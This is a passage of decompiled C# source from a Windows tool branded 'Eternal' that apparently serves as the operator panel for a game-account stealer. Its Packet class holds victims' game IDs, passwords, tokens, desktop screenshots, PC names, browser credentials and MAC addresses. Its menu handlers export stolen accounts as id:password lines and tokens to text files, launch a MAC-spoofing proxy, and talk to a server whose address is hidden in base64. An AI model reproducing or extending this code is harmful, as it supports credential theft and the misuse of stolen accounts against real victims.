				this.SentPost(this.PostText.Text, Convert.ToInt32(this.startbox.Text), this.taxbox.Text, 1);
				bool flag = Convert.ToInt32(this.startbox.Text) % 100 == 0;
				if (flag)
				{
					this.logbox.AppendText("\nSuccessfuly saved setor to " + this.startbox.Text + ".jpg");
				}
			}
			else
			{
				this.SentPost(this.PostText.Text, Convert.ToInt32(this.startbox.Text), this.taxbox.Text, 0);
			}
			bool flag2 = Convert.ToInt32(this.startbox.Text) == Convert.ToInt32(this.stopbox.Text);
			if (flag2)
			{
				this.stopbutton.PerformClick();
				this.timer1.Enabled = false;
				this.timer1.Stop();
			}
			this.SaveSettings();
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00009149 File Offset: 0x00007349
		private void stopbutton_Click(object sender, EventArgs e)
		{
			this.stopbutton.Enabled = false;
			this.startbutton.Enabled = true;
			this.timer1.Enabled = false;
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00009173 File Offset: 0x00007373
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00009178 File Offset: 0x00007378
		private void button1_Click_1(object sender, EventArgs e)
		{
			string[] arr = new string[]
			{
				"http://*:80/"
			};
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00009195 File Offset: 0x00007395
		private void delay_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00009198 File Offset: 0x00007398
		private void startProxyWithMacToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string mac = this.maclist.SelectedItems[0].Text;
				bool flag = string.IsNullOrEmpty(mac);
				if (flag)
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = MainForm.directory + "\\proxynew.exe",
						Arguments = "nope",
						UseShellExecute = true
					});
				}
				else
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = MainForm.directory + "\\proxynew.exe",
						Arguments = mac,
						UseShellExecute = true
					});
				}
			}
			catch
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = MainForm.directory + "\\proxynew.exe",
					Arguments = "nope",
					UseShellExecute = true
				});
			}
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00009284 File Offset: 0x00007484
		private void startProxyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string mac = this.maclist.Items[0].Text;
				bool flag = string.IsNullOrEmpty(mac);
				if (flag)
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = MainForm.directory + "\\proxynew.exe",
						Arguments = "nope",
						UseShellExecute = true
					});
				}
				else
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = MainForm.directory + "\\proxynew.exe",
						Arguments = mac,
						UseShellExecute = true
					});
				}
			}
			catch
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = MainForm.directory + "\\proxynew.exe",
					Arguments = "nope"
				});
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00009368 File Offset: 0x00007568
		private void MainForm_FormClosing_1(object sender, FormClosingEventArgs e)
		{
			DiscordRpc.Shutdown();
			Environment.Exit(0);
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00009378 File Offset: 0x00007578
		private void removeAccountToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.materialListView1.SelectedItems)
				{
					ListViewItem item = (ListViewItem)obj;
					this.DeleteAccount(item.SubItems[0].Text, false);
					this.materialListView1.SelectedItems[0].Remove();
				}
			}
			catch (Exception a)
			{
				Application.DoEvents();
			}
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00009420 File Offset: 0x00007620
		private void removeAllAccountsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				this.DeleteAccount("", true);
				this.materialListView1.Items.Clear();
			}
			catch (Exception a)
			{
				Application.DoEvents();
			}
		}

		// Token: 0x06000086 RID: 134 RVA: 0x0000946C File Offset: 0x0000766C
		private void materialButton8_Click(object sender, EventArgs e)
		{
			bool flag = string.IsNullOrEmpty(this.newpass.Text) || string.IsNullOrEmpty(this.oldpass.Text);
			if (flag)
			{
				MessageBox.Show("Please fill in the blanks!", "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				bool flag2 = this.oldpass.Text.Hash() == Variables.Password.Hash();
				if (flag2)
				{
					NameValueCollection post = new NameValueCollection();
					post["username"] = Variables.Username;
					post["password"] = Variables.Password.Hash();
					post["hwid"] = Variables.Hwid;
					post["newpwd"] = this.newpass.Text.Hash();
					string data = Program.client.UploadValues("http://" + Variables.basedata.Base64Decode() + "/server/changepassword.php", post).Byte2String();
					bool flag3 = data.Contains("Changed!");
					if (flag3)
					{
						using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default).CreateSubKey("Eternal"))
						{
							bool flag4 = key != null;
							if (flag4)
							{
								key.SetValue("Username", Variables.Username);
								key.SetValue("Password", this.newpass.Text);
							}
						}
						MessageBox.Show("Your password successfuly set to " + this.newpass.Text, "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				else
				{
					MessageBox.Show("Your old password is wrong", "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x0000962C File Offset: 0x0000782C
		private void appendTokensToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00009630 File Offset: 0x00007830
		private void saveTokensToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog save = new SaveFileDialog())
			{
				save.Filter = "Executable (*.txt)|*.txt";
				save.FileName = "tokens.txt";
				bool flag = save.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					try
					{
						foreach (object obj in this.materialListView1.SelectedItems)
						{
							ListViewItem item = (ListViewItem)obj;
							File.AppendAllText(save.FileName, item.SubItems[8].Text + "\n");
						}
					}
					catch (Exception a)
					{
						Application.DoEvents();
					}
					MessageBox.Show("Successfuly exported " + this.materialListView1.SelectedItems.Count.ToString() + " to " + save.FileName, "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00009764 File Offset: 0x00007964
		public static string GenerateMACAddress()
		{
			Random random = new Random();
			byte[] buffer = new byte[6];
			random.NextBytes(buffer);
			string result = string.Concat((from x in buffer
			select string.Format("{0}:", x.ToString("X2"))).ToArray<string>());
			return result.TrimEnd(new char[]
			{
				':'
			});
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000097CC File Offset: 0x000079CC
		[DebuggerStepThrough]
		private void applySavedatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//MainForm.<applySavedatToolStripMenuItem_Click>d__86 <applySavedatToolStripMenuItem_Click>d__ = new MainForm.<applySavedatToolStripMenuItem_Click>d__86();
			//<applySavedatToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<applySavedatToolStripMenuItem_Click>d__.<>4__this = this;
			//<applySavedatToolStripMenuItem_Click>d__.sender = sender;
			//<applySavedatToolStripMenuItem_Click>d__.e = e;
			//<applySavedatToolStripMenuItem_Click>d__.<>1__state = -1;
			//<applySavedatToolStripMenuItem_Click>d__.<>t__builder.Start<MainForm.<applySavedatToolStripMenuItem_Click>d__86>(ref <applySavedatToolStripMenuItem_Click>d__);
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00009813 File Offset: 0x00007A13
		private void MainForm_Validated(object sender, EventArgs e)
		{
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00009816 File Offset: 0x00007A16
		private void MainForm_VisibleChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00009819 File Offset: 0x00007A19
		private void MainForm_Validating(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x0600008E RID: 142 RVA: 0x0000981C File Offset: 0x00007A1C
		private void MainForm_Layout(object sender, LayoutEventArgs e)
		{
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000981F File Offset: 0x00007A1F
		private void MainForm_Activated(object sender, EventArgs e)
		{
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00009822 File Offset: 0x00007A22
		private void materialTextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00009828 File Offset: 0x00007A28
		private void accountToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog save = new SaveFileDialog())
			{
				save.Filter = "Executable (*.txt)|*.txt";
				save.FileName = "accs.txt";
				bool flag = save.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					try
					{
						foreach (object obj in this.materialListView1.SelectedItems)
						{
							ListViewItem item = (ListViewItem)obj;
							File.AppendAllText(save.FileName, item.SubItems[2].Text + ":" + item.SubItems[3].Text + "\n");
						}
					}
					catch (Exception a)
					{
						Application.DoEvents();
					}
					MessageBox.Show("Successfuly exported " + this.materialListView1.SelectedItems.Count.ToString() + " to " + save.FileName, "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
		}

		// Token: 0x04000046 RID: 70
		public static int index = 0;

		// Token: 0x04000047 RID: 71
		public static IWebDriver driver;

		// Token: 0x04000048 RID: 72
		private DiscordRpc.EventHandlers handlers;

		// Token: 0x04000049 RID: 73
		private DiscordRpc.RichPresence presence;

		// Token: 0x0400004A RID: 74
		public static string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Eternal-Bin";

		// Token: 0x0400004B RID: 75
		public static bool authtenticated = false;

		// Token: 0x0400004C RID: 76
		public static int sayi;

		// Token: 0x0400004D RID: 77
		public static int stop = 0;

		// Token: 0x0400004E RID: 78
		private static Random qwe = new Random();

		// Token: 0x02000028 RID: 40
		public class Packet
		{
			// Token: 0x1700002E RID: 46
			// (get) Token: 0x0600012B RID: 299 RVA: 0x00013A87 File Offset: 0x00011C87
			// (set) Token: 0x0600012C RID: 300 RVA: 0x00013A8F File Offset: 0x00011C8F
			public string growid { get; set; }

			// Token: 0x1700002F RID: 47
			// (get) Token: 0x0600012D RID: 301 RVA: 0x00013A98 File Offset: 0x00011C98
			// (set) Token: 0x0600012E RID: 302 RVA: 0x00013AA0 File Offset: 0x00011CA0
			public string password { get; set; }

			// Token: 0x17000030 RID: 48
			// (get) Token: 0x0600012F RID: 303 RVA: 0x00013AA9 File Offset: 0x00011CA9
			// (set) Token: 0x06000130 RID: 304 RVA: 0x00013AB1 File Offset: 0x00011CB1
			public string lastworld { get; set; }

			// Token: 0x17000031 RID: 49
			// (get) Token: 0x06000131 RID: 305 RVA: 0x00013ABA File Offset: 0x00011CBA
			// (set) Token: 0x06000132 RID: 306 RVA: 0x00013AC2 File Offset: 0x00011CC2
			public string token { get; set; }

			// Token: 0x17000032 RID: 50
			// (get) Token: 0x06000133 RID: 307 RVA: 0x00013ACB File Offset: 0x00011CCB
			// (set) Token: 0x06000134 RID: 308 RVA: 0x00013AD3 File Offset: 0x00011CD3
			public string desktoppic { get; set; }

			// Token: 0x17000033 RID: 51
			// (get) Token: 0x06000135 RID: 309 RVA: 0x00013ADC File Offset: 0x00011CDC
			// (set) Token: 0x06000136 RID: 310 RVA: 0x00013AE4 File Offset: 0x00011CE4
			public string pcname { get; set; }

			// Token: 0x17000034 RID: 52
			// (get) Token: 0x06000137 RID: 311 RVA: 0x00013AED File Offset: 0x00011CED
			// (set) Token: 0x06000138 RID: 312 RVA: 0x00013AF5 File Offset: 0x00011CF5
			public string browsercreds { get; set; }

			// Token: 0x17000035 RID: 53
			// (get) Token: 0x06000139 RID: 313 RVA: 0x00013AFE File Offset: 0x00011CFE
			// (set) Token: 0x0600013A RID: 314 RVA: 0x00013B06 File Offset: 0x00011D06
			public string mac { get; set; }
		}
	}
}
